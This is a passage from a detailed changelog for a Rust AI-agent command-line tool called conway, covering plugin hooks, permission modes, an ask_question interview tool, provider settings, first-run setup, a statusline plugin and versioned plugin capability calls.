always has — before the mode gate, the cache, pattern allows, and `AutoAllow` — by construction, not a second dispatch path. **Provenance is made structural, not left to the stderr warning alone**: a plugin's own bare hook id is host-namespaced with its declaring plugin's manifest id before it ever reaches dispatch (an author never picks its own namespace, mirroring `declared_plugin_events`/`CommandRegistry::build`'s identical rule for event/command names) — a duplicate id (empty, or colliding with an existing `[hooks].rules[]` entry or another plugin's own hook) is a hard `FacadeError::Build` naming the offender. `conway_core::hook::HookOrigin` (`Operator`/`Plugin(id)`) is threaded through `PreToolUseHookSpec`/`HookSpec` and read by `Conway::active_deny_capable_hook_rules`, whose `HookRuleView::origin` now reports `"plugin '<id>'"` for a plugin-contributed rule instead of the blanket `"settings.json (merged config)"` label every rule got before this item (that label's own doc used to correctly claim `[hooks].rules[]` was the ONLY possible source — this item is what made that claim false, and the fix). `crates/conway-cli/src/claude_compat_plugins.rs`'s `install` now wraps its translated `HookRegistration`s as a `ClaudeCompatHooksPlugin` and attaches it via `ConwayBuilder::with_plugin` — the SAME seam its MCP half already used — instead of `config_mut`, which is now REMOVED (its one caller). Every existing claude-compat hook behaviour is preserved and re-pinned against the new seam (`a_translated_pre_tool_use_hook_carries_on_failure_deny`, the deny-capable stderr warning still sourced from `conway::DENY_CAPABLE_EVENTS`), and `child_spawned`'s `mode` field (`SubagentMode::{Fork,Spawn}`, unrelated general subagent-orchestration data, not inference-hook machinery) is untouched and newly pinned by a direct payload-content test. Out of scope, deliberately: a hook performing IN-PROCESS INFERENCE to reach its own verdict — that half of an earlier, broader `Plugin::hooks()` proposal was cancelled for want of a consumer (decision `01M128AP39WXE01BBZV4RENC4M`) and is not reopened here.

- **`conway::agents::load_agent_defs` and `conway::skills::load_skill_defs` are no longer single-root** — board item `01M0X1EH2GW5DKY9XD1EZ78S3F`. Both now have a `_from_roots(dirs: &[PathBuf])` counterpart that reads an ORDERED list of roots into one merged map: `dirs[0]` (the operator's own directory) keeps the exact original strict contract — a malformed file there is still a loud, propagated build error — and always wins a name collision against any later root; every root after it is treated as third-party (e.g. a plugin's own directory), so a malformed file, or a within-root name collision, there is logged via `tracing::warn!` and skipped rather than failing the whole load. The single-root functions are now thin one-element-slice wrappers over the new ones, so every existing caller (`ConwayBuilder::build`, `crate::intent`, `conway-cli`'s `--agent` resolution, `conway_plugin_skills::SkillsPlugin::from_dir`) keeps compiling and behaving byte-for-byte identically without a single call site changing. `AgentsConfig` gains `extra_dirs: Vec<PathBuf>` (empty by default, so every existing config keeps behaving identically) — additional agent-definition roots `ConwayBuilder::build` now resolves against `cwd` and folds in alongside `dir`; nothing populates it automatically yet, an operator can hand-set it today. Skills stay configless (no new `[skills]` section — unnecessary config surface this item's own scope doesn't call for, matching this crate's existing precedent for that section). `docs/plugins/claude-compat.md`'s `skills/`/`agents/` "not imported, at all" paragraphs are corrected: the loader capability exists and is tested now, but the Claude Code compat layer does not yet call it with a plugin's own directories — that wiring is a separate, deferred item.
  **Superseded in part by the entry immediately below** — the `AgentsConfig::extra_dirs` field this bullet describes no longer exists.

- **The multi-root skills/agents split from the entry above is closed, and `AgentsConfig::extra_dirs` is retired** — board item `01M0XRE2N96ATHEXJ1617E133P`. `skills::load_skill_defs_from_roots` had shipped with zero production callers: `ConwayBuilder::build` still called the single-root `load_skill_defs`, and there was no config surface to reach the multi-root path through at all — while `agents` had a real, hand-settable `AgentsConfig::extra_dirs` field. Rather than add a matching `[skills]` config section (which would have forced every one of `ConwayConfig`'s ~40 existing hand-written struct-literal call sites across the workspace to name a new field, since `ConwayConfig` has no `#[derive(Default)]` — the same blast-radius reasoning `ConwayBuilder::with_root`'s own root field was already kept off `ConwayConfig` for), both loaders' second-root capability now lives on `ConwayBuilder` instead: `with_extra_agent_dir` and the new `with_extra_skill_dir`, each appending one additional root (call repeatedly for more than one, mirroring `with_plugin`'s own repeat-to-add shape), resolved against `cwd` and folded in after the operator's own root — `AgentsConfig::dir` for agents, the unchanged fixed `.conway/skills` default for skills — with the exact same precedence `load_*_defs_from_roots` already enforced (operator's own root wins a collision; a later root's malformed file is skipped, not fatal). `AgentsConfig::extra_dirs` is removed (no operator config today ever set it, so this is not a breaking change to any real `settings.json`); agents and skills are symmetric again — neither has a config field, both are reachable through the identical builder-level seam a Claude Code compat layer (or any other embedder) can call before `build()`. No existing single-root caller or test needed editing: `agents_dir`/`skills_dir` still resolve first, unconditionally, exactly as before.

### Added

- **`conway.ui` becomes a standalone operator-facing feature: a model-callable `ask_question` tool, and a live TUI surface to answer it on** — board item `01M19NH39AE2D5AMJK0RZRQY86`, operator decision `01M19NF1C8E8CA8Y3X653Q3R23`: *"conway.ui should work as a standalone feature, making the consumer rule moot. I need to be able to prompt a model to be able to interact with me in an interview format."* `conway-plugin-ui`'s `ConwayUiPlugin` now contributes one tool, `ask_question` (a prompt plus a fixed, ordered option list in, one chosen answer back — the SAME declarative shape `ui.form` already used, unwidened: the item's own spec named "the shape can't express what a real interview needs" as a live falsifier, and it did not fire), reachable directly by the model — the licensing consumer the earlier item (`01M0WWPA70E8YAAN981EK10D3D`) deliberately shipped without, since its only consumer then was a proof-of-mechanism tool with no on-screen need. `ui.form` itself is untouched: `skeleton_ask` still calls it over Edge B exactly as before. **A live, interactive `FormSurface` is now wired in, for the TUI only**: new `crates/conway-cli/src/tui/form.rs` (`TuiFormSurface`), mirroring `tui::gate::TuiGate`'s own "channel built in `main.rs`, before `ConwayBuilder::build()`, so a tool-call thread can block while the app loop renders and answers" shape exactly. `ask_question`'s modal (`Mode::UiForm`, `tui::state::modal`) is the FIFTH surface in the TUI's existing never-stack park/promote queue (permission prompt, `/ask` modal, intent-confirm card, trust-preview card, now this) — no second, competing modal stack, joining the existing discipline at the lowest priority. `Up`/`Down` move the highlighted option, `Enter` answers, `Esc` cancels; the answer travels back over the same `oneshot` channel the blocked tool call is awaiting, entirely inside `AppState` (`AppState::resolve_ui_form`), needing no live facade call the way the `/ask`/trust-preview cards' own decisions do. Every OTHER dispatch target (one-shot `-p`, `sessions`, `routes`, a plugin subcommand) still constructs `ConwayUiPlugin::default()` (no surface) — a call there degrades in plain text rather than blocking, never marked a tool error, the same main-line posture `skeleton_ask`'s own degrade already established; `crates/conway-cli/tests/ui_form_degrades_under_one_shot.rs` (`skeleton_ask`'s own sibling coverage) passes unchanged, and a NEW compiled-binary test (`ui_ask_question_one_shot.rs`) proves the identical absent/no-surface pair for `ask_question` directly. End to end: `conway-plugin-ui`'s own new tests drive `ask_question` through a real `Tool::invoke`; `crates/conway-cli/src/tui/form.rs`'s own tests prove the channel's round trip and fail-closed cancellation; a new test in `tui/form.rs` drives a real `ask_question` call, a real `TuiFormSurface`, `AppState::offer_ui_form`, the REAL `input::handle_key` router, and `AppState::resolve_ui_form` end to end, asserting the exact answer the operator picked reaches the blocked tool call's own `ToolOutput` — disclosed as not a PTY-driven run of the compiled binary (no such harness exists anywhere in this crate's test suite), the identical boundary `tui/app/ask.rs`'s own precedent already draws. `docs/plugins/ui.md` is rewritten; `docs/plugins/README.md`, `ARCHITECTURE.md`, `README.md`, and `docs/vision/DESIGN-plugin-dependencies.md` §8/§9 are corrected in place. `docs/vision/DESIGN-plugin-dependencies.md` §8's third falsifier ("no second consumer of a plugin-provided capability appears") is amended, not closed: its premise no longer applies to `conway.ui`, whose justification no longer runs through Edge B at all, but Edge B's own justification (whether the plugin→plugin channel ever gets a real second consumer) remains exactly as open a question as before — this item does not vindicate it.

- **`/settings` gets a "defaults" section: the default role, settable; the default model, shown but derived** — board item `01M18Q7P25DTSKQJDJJCC3E800`, closing `docs/vision/DESIGN-surface-coherence.md`'s corrected rule 1 ("`/settings` holds global, persistent configuration... the *default* model and *default* role live inside it, labelled as defaults") and its own §11 open question ("where the default model actually lives"). **Decision, with the rejected alternative kept alongside its cost:** a `default_model` scalar beside `default_role` was considered and rejected — model selection already has exactly one source of truth in this schema, `roles.<alias>.chain`, and a parallel field would be a second one nothing keeps in sync. Chosen instead: `ConwayConfig::default_model()` is a DERIVED read, the head of the default role's own `chain` (`crates/conway/src/config/schema.rs`) — the cost accepted is that "default model" is a computed display, not independently settable; an operator changes it by changing `default_role` or that role's `chain`, never a `default_model` key, because none exists. New writer `conway::config::set_default_role` (`crates/conway/src/config/writer.rs`) is the fourth in that module, and the first that refuses a missing key rather than inventing one (`default_role` is required wire schema). The `/settings` menu's new "defaults" group (`crates/conway-cli/src/tui/view/settings.rs`) shows `default role -- <role> (default) (Enter to cycle)` as a settable, wrapping leaf, and `default model -- <model> (default; ...)` as a read-only `MenuNode::Static` row with no `Enter` behavior at all — structurally, not just by convention, there is no way to set it independently. Both refresh from the real merged config (never `Conway::config()`'s stale build-time snapshot) on the same "reopen `/settings`" seam the providers section already uses (`crates/conway-cli/src/tui/app/defaults.rs`, new). `docs/interactive.md`'s `/settings` section and `docs/routing.md`'s "Viewing and changing the default from the TUI" describe the user-facing behavior; `docs/interactive.md`'s group count and `crates/conway-cli/src/tui/view/settings.rs`'s own "Grouping" doc, both already stale (naming four groups when a fifth, "providers", had shipped since), are corrected in full rather than appended to.

- **`conway.ui`: the first bundled plugin to publish an Edge B capability, and the first in-tree caller of `call_versioned`** — board item `01M0WWPA70E8YAAN981EK10D3D`. New crate `conway-plugin-ui` (`ConwayUiPlugin`) publishes `ui.form` at `1.0.0`: a request carrying a prompt and a fixed, ordered list of options in, one selected option back — the AskUserQuestion analogue, a blocking pull over Edge B. Built narrow, on purpose: no checkbox, no multi-select, no nested widget tree, only the single-select shape its one shipped consumer (`conway-plugin-skeleton`'s new `skeleton_ask` tool, calling `CapabilityCallHandle::call_versioned` with `^1` — that method's own forward-declaration doc named this item as its intended first consumer, and it now is one) exercises. First-party and bundled per operator ruling (`docs/vision/DESIGN-plugin-dependencies.md` §0), but bundled is not enabled: `[plugins].install` must name `"conway.ui"`, the same opt-in posture every other bundle member has — a build with no `[plugins]` section installs it not at all. **Declared honestly rather than modelled as a host-capability requirement**: whether a live drawing surface exists is a property of the running process, not of `settings.json`, so `ConwayUiPlugin` takes its answering `FormSurface` as a plain constructor argument (`Some`/`None`), mirroring `crates/conway-cli/src/tui/gate.rs`'s `TuiGate` shape — every call into `ui.form` refuses per-call when none is wired in, rather than failing this plugin's own installation. **No live, interactive `FormSurface` ships in this pass** — a disclosed scope decision: `crates/conway-cli/src/first_party_plugins.rs` constructs `ConwayUiPlugin::default()` (no surface) for every dispatch target today, TUI included, since no shipped form yet needs a specific rendering and the TUI already owns one modal stack (built for the permission prompt) this item does not add a second, competing one to. Consequently every host today refuses every `ui.form` call, and the consumer's own job is to degrade from that refusal rather than fail: `skeleton_ask`'s reply says so in plain text, and its tool result is never marked an error, whether `conway.ui` is absent, present at an incompatible version, or present with no surface — proven end to end by a NEW compiled-binary test (`crates/conway-cli/tests/ui_form_degrades_under_one_shot.rs`) driving a real `conway -p` one-shot run, plus a sibling proving absence-by-default (`ui_form_absent_by_default.rs`). New docs page `docs/plugins/ui.md`; `docs/plugins/hooks.md` point 21, `docs/plugins/subprocess-plugins.md`, `docs/plugins/trust-and-security.md`, and `docs/vision/DESIGN-plugin-dependencies.md` §9 are all corrected in place, since each carried a "no in-tree caller yet"/"not yet built" label naming this exact item. **2026-08-30 correction: "no live, interactive `FormSurface` ships" is no longer true — see board item `01M19NH39AE2D5AMJK0RZRQY86`, below, for the item that wires one in and the ruling that licensed it.**

- **A capability edge now carries a version, in standard semver, and a mismatch refuses rather than degrades** — decision `01M189XS6Z9VKYENAHNY1B54CM`, which supersedes an earlier same-cycle decision (`01M1893Q2DV773ZQ5B138W6G07`) on mechanism only; that decision's own case for versioning capability edges at all still stands. Edge B's plugin-to-plugin capability CALL channel (`conway_core::ports::capability`, `CapabilityProvider`/`CapabilityRegistry`/`CapabilityCallHandle`) previously matched a capability purely by name, with no way to express "this consumer needs at least version X of what it's calling." `CapabilityRegistration` gains a `version: semver::Version` field the PROVIDER declares, separate from its `HostCapability` name (`ui.form` stays `ui.form`; `1.0.0` is this field, never folded into the name string) — an earlier draft of this item invented a bespoke `ui.form/1`-style major-exact identifier instead, rejected on operator direction not to reinvent standard semver. The CONSUMER supplies a `semver::VersionReq` to the new `CapabilityCallHandle::call_versioned` (`^1` for an ordinary floor, `=1.2.3` for a hard pin — the operator specifically asked for pinning, and `VersionReq` gives it for free, which is why one type covers both). Resolution is `req.matches(&version)`; a mismatch refuses as `CapabilityCallError::VersionMismatch { capability, required, available }`, naming both, never silently degrading — the same refuse-not-degrade posture `docs/vision/DESIGN-plugin-dependencies.md` §0 ruling 3 already states for a missing dependency, applied here to a present-but-incompatible one. No resolver was built and none was needed: a capability name has exactly one provider (`DuplicateCapabilityProvider` already refuses a second registration for the same name at construction), so there is no candidate set to select among — `VersionReq::matches` is a predicate over a single pair, not a search; a second provider for the same name, if one ever exists, is its own future item. `semver` (already present in `Cargo.lock` at 1.0.28, pulled in transitively) is now a direct dependency of `conway-core` only — the promotion adds no new lock entry. `conway-plugin-subprocess`'s out-of-process `provides` capabilities now carry a version too, borrowed from that plugin's own `PluginManifest::version` (parsed as semver, degrading to `0.0.0` — never a panic — when that string is not valid semver, since it is untrusted plugin-authored input). `docs/vision/DESIGN-plugin-dependencies.md` §7b is closed in place (the "name-only first" recommendation is superseded, kept alongside the ruling per this page's own convention) and §9 records both decision ids; `docs/plugins/hooks.md` point 21 and `docs/plugins/subprocess-plugins.md`'s "Providing a capability" section describe the mechanism; `docs/plugins/trust-and-security.md` states plainly that versioning is a compatibility refusal, not a change to the existing plugin-to-plugin trust boundary (who may call whom, and with what payload, is unaffected).

- **The `/settings` menu gets a providers section: list, add, and remove — no more hand-editing `settings.json` as the only door** — board item `01M11XWB4T8ZADNDB4M8R482MA`. Every `backends.<id>` entry the current merged config declares is listed with its id, `kind`, and a LIVE status, classified via `conway::backend_usability::classify_fleet` under `ProbePolicy::All` (never the startup path's `LocalOnly` — opening this section is an explicit request for live status, and pays the connection cost accordingly, off the render loop so a slow probe never freezes the TUI). Three states render, visibly distinct: `working`; `not working: <reason>`, the reason straight from `Unusable`'s own `Display` (an unset `api_key_env` names the variable; a refused connection names the URL) — never re-worded; and `undetermined: <reason>` for a genuinely unknown case (a local server needing no credential, a probe that hasn't answered) — deliberately never rendered as a failure. A provider not yet classified reads `checking...`. **Adding** a provider offers the same two shapes (`crates/conway-cli/src/first_run.rs::HOSTED_CHOICES`) the first-run flow already offers, reused verbatim rather than a second list — an already-set credential env var writes in one keystroke; otherwise a new one-line, never-echoed credential prompt (`Mode::AddProviderCredential`) asks for the key. The write is the same `conway::config::set_backend_provider` splice the first-run flow and a hand-edit both use, so an operator's comments and key order survive byte-for-byte outside the changed table, and the listing refreshes immediately (no restart needed to see a freshly added provider working). **Removing** a provider checks every `roles.*.chain` for a reference first and refuses, naming the affected role(s), before any write — following the toggle-off refusal `app/plugin_toggle.rs` already established for the analogous plugin-dependency hazard, rather than warning-and-proceeding. Whichever settings category comes next, the coherence question this item deliberately left open for its own dedicated session: plugins concluded "one home, not two" by moving ownership OUT of `/settings` into `/plugin`; this item concludes the opposite — `/settings` owns providers directly, with no sibling command at all.

- **A first-run guided-setup flow replaces the old hard "no backends configured" error** — board item `01M11XVEHNMYY942JE63F7MAFH`. Starting `conway` with no usable model provider used to print `conway: error: no backends configured: add a [backends.<id>] entry to config or call ConwayBuilder::with_backend` and quit — a message written for someone who already knows what a backend entry is. The trigger is `conway::backend_usability::FleetUsability::should_offer_guided_setup()` (board item `01M11XSN7JK0N23XBNDFJKZB91`), called directly rather than re-derived, from a new choke point in `conway-cli`'s `main.rs::build_conway`, reached by every dispatch target the same way that function already is. **Interactive** (a real terminal on both stdin and stdout, and never under `-p`/`--print`, which is always treated as non-interactive by design): `crates/conway-cli/src/first_run.rs` probes for a local Ollama server already running (`http://127.0.0.1:11434`, the one endpoint this flow ever probes) and asks it which model it actually has loaded before offering it, so accepting it costs one keypress and needs no key, no signup, and no browser; otherwise it offers the two provider shapes `conway-plugin-backends` ships (Anthropic, OpenAI), reuses an already-exported credential environment variable via `api_key_env` when one exists rather than prompting at all, and otherwise prompts for a literal key — never echoed to the terminal, written into a transcript, or captured in a session log, and disclosed in plain language, before the write, that a literal key is stored in plain text. The saved entry (`conway::config::set_backend_provider`, board item `01M11XTB238YHXV01FWF8SFZH2`) is verified with one real completion (never a reachability probe) against a throwaway, isolated session store; a wrong credential fails verification with the real error text and offers a retry; declining leaves the fleet as it was, with a clear statement of what will not work. **Non-interactive** (`-p`, a pipe, CI): never prompts and never hangs — it prints the exact file path and a complete, pasteable JSON snippet to add by hand, then exits. **A working, already-configured provider is unaffected**: the trigger's own `ProbePolicy::LocalOnly` never probes a non-local, credentialed backend, so an ordinary hosted setup pays no added startup delay and starts straight into a session with no flow at all. `docs/getting-started.md`'s "Configure a provider" section now describes this flow as the interactive default, with hand-editing `settings.json` documented as what it degrades to non-interactively (previously documented as the only path).

- **`conway.statusline`: a plugin that runs an operator-configured command on a bounded refresh cadence and pushes its output onto the status line** — board item `01M0X500861X9035QJEA82F94K`, the migration home for a Claude Code `statusLine.type`/`statusLine.command` pair, which conway's own status line (a closed ten-variant vocabulary) cannot express by design. New crate `conway-plugin-statusline` (`StatusLinePlugin`/`StatusLineSpec`): a background task runs the configured argv command, publishes the result to a non-blocking `Arc<Mutex<_>>` cache, and sleeps — `Plugin::status_contributions()` only ever reads that cache, never spawns, so a slow or hung command can never stall a reader (the identical "lossy-with-notice, the host turn never blocks on a slow plugin read loop" posture `crates/conway-core/src/ports/plugin.rs`'s `Plugin::observe_sink` doc already states, reused here for a synchronous read instead of a queue). The refresh interval is floored at `MIN_REFRESH_INTERVAL_MS` (1000ms) regardless of configuration, bounding worst-case process spawns at 60/minute no matter what an operator writes into `settings.json`; the default (5000ms) is 12/minute. A failing, absent, or silently-successful (zero exit, empty stdout) command renders `ResultStatus::Failed` with a legible reason carried in both `error` and `value` — never an empty string indistinguishable from success. New `[tui.status_line_command]` config section (`crates/conway/src/config/schema.rs`'s `StatusLineCommandConfig`: `command` argv, `key`, `refresh_interval_ms`, `timeout_ms`), resolved by a new, FIFTH sibling choke point `crates/conway-cli/src/statusline_plugin.rs` — deliberately NOT an eleventh `first_party_plugins::bundle()`/`[plugins].install` entry, since naming a command in this field is already the complete opt-in signal, the same shape `[plugins].subprocess[]`/`[plugins].mcp[]`/`[plugins].claude_compat[]` already have. Off by construction (no background task started, no process ever spawned) when `command` is empty, the default. Trust posture stated plainly, both in the config field's own doc and in the new `docs/plugins/statusline.md` page: identical footing to `[hooks].rules[].command` — no sandboxing, no digest check. **The permission-mode field is never displaced**: this plugin produces ordinary `PluginStatusContribution`s through the same host-side storage every status-contributing plugin already uses, so the existing `view/status.rs` non-displacement guarantee (`drop_priority` ranking `Contributions` strictly below `Mode`, `plugin_contributions_never_displace_the_forced_in_mode_field`) already covers it uniformly — nothing in this item touches that file. **The concrete finding for `DESIGN-plugin-dependencies.md` §7c** (does one mechanism serve both push and pull?): `PluginStatusContribution` the TYPE needed nothing new — it already carries a value, a success/failure verdict, and a failure reason. What is missing is entirely host-side: `Conway::plugin_status_contributions()` is a build-time snapshot, read exactly once, before this plugin's background loop has any reliable chance to have produced a value — proven, not merely argued, by this crate's own `tests/statusline_end_to_end.rs` (a fast command reaches the real facade snapshot when given a head start; the identical command and plugin produce nothing in that same snapshot with no head start, while the plugin's own live read shows the value arriving moments later). A live per-session poll (or the pull half §7c already names) is the missing piece, not a wider `PluginStatusContribution`. **2026-08-27 correction: that missing piece is now built.** Board item `01M0Y3A8MYKKE0GMYKZE1K0QTD` (commit `00cba5c`) added `Conway::poll_plugin_status_contributions` and a bounded per-session poll in `conway-cli`'s `App::run` — see that entry below, and `docs/plugins/statusline.md`, for the live mechanism this paragraph describes as absent.

- **A live per-session poll for plugin status contributions — the gap the entry above found closes** — board item `01M0Y3A8MYKKE0GMYKZE1K0QTD` (2026-08-27, retroactive entry: this item shipped 2026-08-25, commit `00cba5c`, with no changelog entry of its own until now). `Conway::poll_plugin_status_contributions` re-invokes `Plugin::status_contributions()` against a live `Arc<dyn Plugin>` handle retained on `Conway` itself (cloned before `PluginRegistry::from_plugins` consumes the original set), and `conway-cli`'s `App::run` polls it on a bounded 1-second tick (`PLUGIN_STATUS_POLL_TICK`, matching `conway-plugin-statusline`'s own refresh floor), overwriting `AppState::plugin_status_contributions` wholesale each time rather than merging. This closes the "read exactly once at build time" gap several entries in this file disclosed and left open: a contribution that only becomes available after `build()` now reaches the rendered status line on the next tick, and one that disappears (a plugin stops reporting, or a guard dies mid-session) drops out on the very next poll, with no separate TTL/expiry step needed. Deliberately NOT threaded through `RuntimeDeps`/`LoopDeps`/`ToolBatchCtx` the way the capability registry is — that channel is reached synchronously from paths this poll has no business blocking. `crates/conway-plugin-statusline/src/lib.rs`'s own module doc gained a dated addendum recording this; `docs/plugins/statusline.md` and this file's own earlier entries describing the snapshot-only behavior are corrected in place, 2026-08-27, rather than left standing beside a paragraph they now contradict.

- **Edge B: a plugin -> plugin capability CALL channel** — board item
  `01M0WWNHQQYN1EVTH8WPZ33EBF`,
  `docs/vision/DESIGN-plugin-dependencies.md` §2. Before this item there
  was no way for one plugin to call into another: `ToolCtx`'s handles were
  all host services, and `PluginEventHandle` is emit-only, fire-and-forget
  pub/sub, not call-and-return — every plugin wanting a checkbox
  reimplemented a checkbox. New `crates/conway-core/src/ports/capability.rs`
  adds `CapabilityProvider` (an object-safe, JSON-in/JSON-out async trait —
  dynamic and serialisable, deliberately NOT a capability-specific Rust
  trait, so an out-of-process plugin can implement it exactly as an
  in-process one does), `CapabilityHost`/`CapabilityRegistry` (the runtime
  dispatcher, refusing rather than silently picking a winner when two
  plugins register the same capability name), and `CapabilityCallHandle`
  (the `ToolCtx`-facing handle, `noop` by default). `Plugin` gains a new
  zero-cost-default `capabilities()` method (the runtime registration,
  mirroring `Plugin::tools` vs `PluginManifest::tools`'s own static/runtime
  split — deliberately NOT a new `PluginManifest` field, which would have
  broken every one of the three dozen existing `PluginManifest { .. }`
  literal call sites across the workspace). `ToolCtx` gains a `capabilities:
  CapabilityCallHandle` field, documented as the one handle on that struct
  that reaches ANOTHER PLUGIN rather than a host service; `conway-runtime`'s
  one production construction site (`tools::runner`) binds it to the
  calling plugin's own id. As shipped in this item that binding was a
  `noop` and the gap was disclosed rather than hidden; the follow-up it
  named (`01M0XXWV3BVDM6Y646WMEBTYT1`, above) landed in the same release
  and threads a real `CapabilityRegistry` through, so nothing in this
  entry's own description of the channel is left unreachable. `crates/conway/src/builder.rs`'s existing
  `missing_required_dependency`/`missing_optional_dependencies` (the
  `PluginManifest::requires`/`::optional` resolution pass) now ALSO treat a
  `requires`/`optional` entry as satisfied by a provided capability name,
  not only an installed plugin id — "one vocabulary, not two" applied to
  the same fields rather than a second, parallel capability-only pair — so
  a `requires` naming a capability nothing installed provides fails at
  `build()` exactly as a `requires` naming an absent plugin id already did,
  and an `optional` one degrades with the same two-channel announcement.
  Every capability name (`Plugin::capabilities()`'s registrations, and every
  name `CapabilityCallHandle::call` is asked to dispatch) is validated
  through the SAME `conway_core::event_name::validate_event_name` shape
  check `HostCapability` already uses — reused, not reimplemented. Tested
  end to end with a fixture provider and consumer, INCLUDING a provider
  that returns an error (`crates/conway-core/src/ports/capability.rs`'s own
  test module) and a fixture provider that forwards over a REAL child
  process (`cat`, over stdin/stdout) to check the channel reaches an
  out-of-process-style implementor on identical terms — genuinely, at the
  trait/channel level; `conway-plugin-subprocess`'s own wire protocol
  (`tool.spec/1`/`tool/1`) is not yet extended to declare or forward a
  capability through this channel, which is the disclosed next step, not
  built here. No actual capability ships in this item (no `conway.ui`, no
  UI) — this is the channel only.
- **Plugin-declared permission modes — a name plus a narrowing, layered on
  a base core mode** — board item `01M0X4YDNVP7TZ0PVSRJ0388SS`, new page
  `docs/plugins/permission-modes.md`. `PermissionMode` stays a closed
  three-variant enum; `Plugin::permission_modes()` (zero-cost default, so
  every existing `Plugin` implementor keeps compiling unmodified) lets a
  plugin declare `PluginDeclaredMode { name, base }` — a display name over
  one of the three core modes. **Structurally cannot be more permissive
  than its base**: the type carries exactly one field anything permission-
  related ever reads (`base`), the same "nothing to widen" shape
  `HookOnFailure`/`HookPermissionVerdict`/`PluginPermissionVerdict` already
  use one level down. New `conway_runtime::permission_mode` module:
  `ModeCycle` computes the Shift+Tab cycle deterministically (three core
  modes, then declared modes sorted by name, independent of plugin install
  order), excludes — never silently picks — a name two plugins collide on
  (naming both), and reconciles a session's active declared mode back to a
  plain core label when its declaring plugin is uninstalled, rather than
  leaving a dangling name. `PermissionBroker` gains
  `active_declared_mode`/`set_active_declared_mode`/
  `select_mode_cycle_entry`, pure display bookkeeping `decide()` never
  reads — `decide()` remains the ONE place a mode's enforcement is decided,
  never duplicated into a second place, unchanged by this item. **An
  `AutoAllow`-based declared
  mode's display label always carries the base's own unmodified
  `"AUTO-ALLOW"` warning verbatim** (`"auto-gated (AUTO-ALLOW)"`, never a
  softened paraphrase) — an inference-gated mode is full permission
  filtered by a model, not a safer mode, and its status-line presentation
  must not imply otherwise (design
  `docs/vision/DESIGN-permission-modes.md` §3b, corrected in place after an
  earlier draft had this backwards). **At the time this item closed, not yet
  wired**: the `crates/conway/src/*` facade change that gathers a real
  plugin's declared modes at startup and drives `Action::CyclePermissionMode`
  through them — every build cycled exactly the three core modes, byte-
  identically to before this item — and `Plugin::hooks()` itself, which a
  declared mode's own classifier ultimately needs and which was deliberately
  a separate item's job (design §6c) rather than built only for this one
  consumer. **2026-08-27 correction: both gaps have since closed.** The
  startup wiring landed two days later, commit `db23a65` ("Wire
  plugin-declared permission modes through to Shift+Tab and the status
  line") — `ConwayBuilder::build` now collects `Plugin::permission_modes()`
  and the TUI's `Action::CyclePermissionMode` handler drives the real cycle,
  not a fixed three-way switch; see `docs/plugins/permission-modes.md` for
  the current state. `Plugin::hooks()` also landed (commit `0a2fa76`,
  board item `01M129QW0GV90QTQS6B3BY3DAR`), for the claude-compat consumer
  design §6c did not have in mind — a declared mode's own classifier hook
  remains unbuilt, per the `conway.permissions` cancellation recorded
  elsewhere in this file.

- **A migration guide for operators coming from Claude Code's
  `settings.json`** — board item `01M0X4Z8B8ZWCHABMQAE9KFWHF`, new page
  `docs/migrating-from-claude-code.md`. Triages every key in a real
  operator `settings.json` into exactly one bucket — maps to existing
  conway config, belongs in a plugin (citing the item), or declined with a
  stated reason — rather than importing Claude Code's configuration model
  wholesale (`INTENT.md` §2; the plugin tier's "nothing runs unasked" rule).
  Translates the operator's actual seven `permissions.allow` rules as the
  worked example: only one survives the trip, because conway deliberately
  has no durable allow grant for `bash` at all (`docs/permissions.md`'s
  Limits section) and a second rule pointed at an already-stale ephemeral
  path. `env` and `hooks.SessionEnd` are recorded as declined per the
  standing ruling in `docs/vision/DESIGN-permission-modes.md` §9, not
  reopened. No new core config key: every field the guide's worked
  `settings.json`/`permissions.json` use already existed in
  `crates/conway/src/config/schema.rs` and
  `crates/conway-core/src/permission_pattern.rs` before this item, checked
  field-for-field against both (and by writing/reading the files back
  against a scratch `CONWAY_CONFIG_DIR` — not merely asserted).
- **Backends can now declare locality** — board item
  `01M0WX4MB7JETFBRZE3AEQNSV3`, closing the gap
  `docs/vision/DESIGN-permission-modes.md` §2e names: nothing used to
  distinguish `http://localhost:11434/v1` from `api.openai.com` except the
  string, and a `local: true` key on a `backends.<id>` entry parsed today
  straight into the untyped `extra` catch-all, meaning nothing —
  accepted-and-ignored, worse than rejected. `BackendEntry` gains a typed
  `local: bool` field (default `false`), and `conway::config::role_is_local`
  answers whether every candidate in a role's configured chain is declared
  local. **Declared, not inferred**: no code reads `base_url` to guess at
  this — every URL-shaped heuristic (`localhost`, `127.0.0.1`, a `.local`
  name) is defeated by an SSH tunnel presenting a remote server identically
  to a local one, so the field is the operator's own claim, trusted as
  given, not audited against the backend's address. This is defence in
  depth, not a correctness guarantee, and changes no routing behaviour: a
  chain falling through from a local candidate to a non-local one still
  does so — refusing that fallthrough is a consumer's policy (e.g. a
  future permission guard), not something this field or the router
  enforces on its own. See `docs/providers.md`'s new "Locality" section
  and `docs/routing.md`'s worked example for the full picture, including
  the tunnel case named again.
- **A plugin can now declare it depends on another plugin, and conway
  enforces it** — board item `01M0WWJMYK0KDC2X7B7MR46FRR`
  (`docs/vision/DESIGN-plugin-dependencies.md` §4/§4a/§4b), two new
  `PluginManifest` fields: `requires` and `optional`, both `Vec<String>`
  of plugin ids, both name-only — an id verifies SOME plugin with that id
  is installed, never which version. (**Correction, 2026-08-29:** `semver`
  is now a real workspace dependency — decision `01M189XS6Z9VKYENAHNY1B54CM`,
  see the entry above — but only for Edge B's separate capability-CALL
  channel; these two `requires`/`optional` fields are unaffected and
  remain name-only exactly as described here.) `ConwayBuilder::build`
  checks the full final installed
  set (built-ins ++ everything `install_selected`/`with_plugin` added):
  a `requires` id absent from it is a hard build error naming both the
  dependent and the missing dependency (mirroring the existing
  `required_host_caps`/`MissingHostCapability` shape, extended to
  plugin-to-plugin edges — "a plugin cannot be enabled without its
  dependencies enabled; not degraded, not silently auto-installed —
  refused"); a cycle among `requires` edges (`a` requires `b` requires
  `a`) is its own named error, `PluginError::DependencyCycle`, since
  neither side of a cycle can ever be satisfied first. An `optional` id
  absent from the installed set never fails the build — the dependent
  loads anyway, degraded, and the degradation is always announced: a
  `tracing::warn!` naming both ids, plus a new `ConfigWarning`
  (`WarningCode::OptionalPluginDependencyMissing`) on `Conway::warnings()`
  for a host that reads it. `ConwayBuilder::install_selected` also
  performs an early, best-effort topological cycle check over what it can
  see before `build()` is reached — but deliberately does **not** reorder
  the `with_plugin` calls it makes, which stay in plain `[plugins].install`
  order: that order is `Plugin::instructions()`'s own injection-precedence
  authority, and resolving a dependency graph is a different question from
